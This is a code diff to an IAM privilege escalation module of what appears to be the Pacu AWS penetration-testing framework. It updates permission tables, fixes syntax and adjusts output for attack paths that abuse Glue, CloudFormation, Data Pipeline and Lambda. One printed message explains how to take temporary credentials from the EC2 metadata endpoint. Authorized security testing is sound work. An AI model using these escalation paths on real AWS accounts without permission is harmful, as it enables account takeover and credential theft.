@@ -25,7 +25,7 @@ module_info = {
     'one_liner': 'An IAM privilege escalation path finder and abuser.',
 
     # Description about what the module does and how it works
-    'description': '\nThis module will scan for permission misconfigurations to see where privilege escalation will be possible. Available attack paths will be presented to the user and executed on if chosen.\n',
+    'description': 'This module will scan for permission misconfigurations to see where privilege escalation will be possible. Available attack paths will be presented to the user and executed on if chosen.\n',
 
     # A list of AWS services that the module utilizes during its execution
     'services': ['IAM', 'EC2', 'Glue', 'Lambda', 'DataPipeline', 'DynamoDB', 'CloudFormation'],
@@ -173,14 +173,17 @@ def main(args, pacu_main):
         'lambda:ListFunctions',
         'dynamodb:CreateTable',
         'dynamodb:DescribeTables',
+        'dynamodb:ListStreams',
         'dynamodb:PutItem',
         'glue:CreateDevEndpoint',
-        'glue:DescribeDevEndpoints'
+        'glue:DescribeDevEndpoints',
         'glue:GetDevEndpoint',
         'glue:GetDevEndpoints',
         'glue:UpdateDevEndpoint',
         'cloudformation:CreateStack',
-        'datapipeline:CreatePipeline'
+        'cloudformation:DescribeStacks',
+        'datapipeline:CreatePipeline',
+        'datapipeline:PutPipelineDefinition'
     ]
     checked_perms = {'Allow': {}, 'Deny': {}}
     escalation_methods = {
@@ -269,6 +272,7 @@ def main(args, pacu_main):
             'iam:PassRole': True,  # Pass the role to the Lambda function
             'lambda:CreateFunction': True,  # Create a new Lambda function
             'lambda:CreateEventSourceMapping': True,  # Create a trigger for the Lambda function
+            'dynamodb:ListStreams': False, # Find existing streams
             'dynamodb:PutItem': False,  # Put a new item into the table to trigger the trigger
             'dynamodb:DescribeTables': False,  # Find an existing DynamoDB table
             'iam:ListRoles': False  # Find a role to pass to the function
@@ -276,28 +280,29 @@ def main(args, pacu_main):
         'PassExistingRoleToNewGlueDevEndpoint': {
             'iam:PassRole': True,  # Pass the role to the Glue Dev Endpoint
             'glue:CreateDevEndpoint': True,  # Create the new Glue Dev Endpoint
+            'glue:GetDevEndpoint': True, # Get the public address of it after creation
             'iam:ListRoles': False  # Find a role to pass to the endpoint
         },
         'UpdateExistingGlueDevEndpoint': {
             'glue:UpdateDevEndpoint': True,  # Update the associated SSH key for the Glue endpoint
             'glue:DescribeDevEndpoints': False  # Find a dev endpoint to update
         },
-        'PassExistingRoleToCloudFormation': {
-            'iam:PassRole': True,
-            'cloudformation:CreateStack': True,
-            'cloudformation:DescribeStacks': True,
-            'iam:ListRoles': False
+        'PassExistingRoleToNewCloudFormation': {
+            'iam:PassRole': True,  # Pass role to the new stack
+            'cloudformation:CreateStack': True,  # Create the stack
+            'cloudformation:DescribeStacks': False,  # Fetch the values returned from the stack. Most likely needed, but possibly not
+            'iam:ListRoles': False # Find roles to pass to the stack
         },
         'PassExistingRoleToNewDataPipeline': {
-            'iam:PassRole': True,
-            'datapipeline:CreatePipeline': True,
-            'datapipeline:PutPipelineDefinition': True,
-            'iam:ListRoles': False
+            'iam:PassRole': True,  # Pass roles to the Pipeline
+            'datapipeline:CreatePipeline': True,  # Create the pipieline
+            'datapipeline:PutPipelineDefinition': True,  # Update the pipeline to do something
+            'iam:ListRoles': False  # List roles to pass to the pipeline
         },
         'EditExistingLambdaFunctionWithRole': {
-            'lambda:UpdateFunctionCode': True,
-            'lambda:ListFunctions': True,
-            'lambda:InvokeFunction': False
+            'lambda:UpdateFunctionCode': True,  # Edit existing Lambda functions
+            'lambda:ListFunctions': True,  # Find existing lambda functions
+            'lambda:InvokeFunction': False  # Invoke it afterwards
         }
     }
 
@@ -385,15 +390,15 @@ def main(args, pacu_main):
             return
 
         for perm in all_perms:
-                for effect in ['Allow', 'Deny']:
-                    if perm in user['Permissions'][effect]:
-                        checked_perms[effect][perm] = user['Permissions'][effect][perm]
-                    else:
-                        for user_perm in user['Permissions'][effect].keys():
-                            if '*' in user_perm:
-                                pattern = re.compile(user_perm.replace('*', '.*'))
-                                if pattern.search(perm) is not None:
-                                    checked_perms[effect][perm] = user['Permissions'][effect][user_perm]
+            for effect in ['Allow', 'Deny']:
+                if perm in user['Permissions'][effect]:
+                    checked_perms[effect][perm] = user['Permissions'][effect][perm]
+                else:
+                    for user_perm in user['Permissions'][effect].keys():
+                        if '*' in user_perm:
+                            pattern = re.compile(user_perm.replace('*', '.*'))
+                            if pattern.search(perm) is not None:
+                                checked_perms[effect][perm] = user['Permissions'][effect][user_perm]
 
     checked_methods = {
         'Potential': [],
@@ -1652,6 +1657,13 @@ def PassExistingRoleToNewGlueDevEndpoint(pacu_main, print, input, fetch_data):
         print('Successfully started creation of the Glue development endpoint {}!\n'.format(dev_endpoint_name))
         print('Now waiting for it to successfully provision, so you can get the public IP address. This takes about 5 minutes, checking-in every 30 seconds until it is ready...\n')
 
+        # TODO: Rework the permissions checker function
+        # to allow a check for wildcard permission requirements
+        # because in this case, I need ONE of the two of
+        # glue:GetDevEndpoint and glue:GetDevEndpoints and
+        # currently I can't say OR in the checks.
+        # Once that is done, add a check here to see which
+        # one we have and to run the appropriate commmand
         while True:
             response = client.get_dev_endpoint(
                 EndpointName=dev_endpoint_name
@@ -1662,7 +1674,7 @@ def PassExistingRoleToNewGlueDevEndpoint(pacu_main, print, input, fetch_data):
 
         print('You can now SSH into the server and utilize the AWS CLI to use the permissions of the role, or you can exfiltrate the temporary credentials, which are stored in the EC2 metadata API. Make an HTTP request to "http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy" to get the current credentials. If that does not work, remove "dummy" from the end of that URL to get the name to use instead (it should be "dummy" though).\n')
         print('WARNING: Glue development endpoints take about five minutes to get up and running, so you will not be able to SSH into the server until then.\n')
-        print('Glue development endpoint details:\n{}\n'.format(json.dumps(response, default=str, indent=2)))
+        print('Glue development endpoint details:\n{}\n'.format(json.dumps(response['DevEndpoint'], default=str, indent=2)))
         return True
     except Exception as error:
         print('Failed to create the Glue development endpoint {}: {}\n'.format(dev_endpoint_name, error))
@@ -1757,7 +1769,9 @@ def PassExistingRoleToNewCloudFormation(pacu_main, print, input, fetch_data):
                 region = None
 
     client = pacu_main.get_boto3_client('cloudformation', region)
-    stack_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
+
+    # The "a" in the beginning as it must start with a letter
+    stack_name = 'a' + ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
 
     template = None
     while not template:
@@ -1833,4 +1847,5 @@ def EditExistingLambdaFunctionWithRole(pacu_main, print, input, fetch_data):
     print('Completed enumeration of Lambda functions in all session regions.\n')
     print('It is suggested to access the functions through the AWS Web Console to determine how your code edits will affect the function. This module does not automatically modify functions due to the high risk of denial-of-service to the environment. Through the AWS API, you are required to first download the function code, modify it, then re-upload it, but through the web console, you can just edit it inline.\n')
     print('Tips: Use the AWS SDK for the language that the function is running to contact the AWS API using the credentials associated with the function to expand your access.\n')
+    print('You can now view the enumerated Lambda data but running the "data Lambda" command in Pacu.\n')
     return True
